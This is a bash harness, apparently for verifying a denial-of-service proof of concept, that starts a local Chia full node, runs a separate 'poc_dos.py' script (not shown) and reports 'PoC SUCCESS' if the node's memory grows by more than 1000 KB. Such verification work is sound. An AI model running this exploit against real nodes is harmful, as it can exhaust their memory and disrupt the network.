#!/bin/bash
source .venv/bin/activate
if ! pgrep -f chia_full_node > /dev/null; then
    chia start node
    sleep 15
fi
PID=$(pgrep -f chia_full_node | head -n 1)
INITIAL_RSS=$(ps -o rss= -p $PID | tr -d ' ')
echo "Initial RSS: ${INITIAL_RSS} KB"
python3 poc_dos.py 5000000
sleep 5
FINAL_RSS=$(ps -o rss= -p $PID | tr -d ' ')
echo "Final RSS: ${FINAL_RSS} KB"
DIFF=$((FINAL_RSS - INITIAL_RSS))
echo "RSS increase: ${DIFF} KB"
if [ "$DIFF" -gt 1000 ]; then
    echo "PoC SUCCESS"
else
    echo "PoC FAILED"
fi
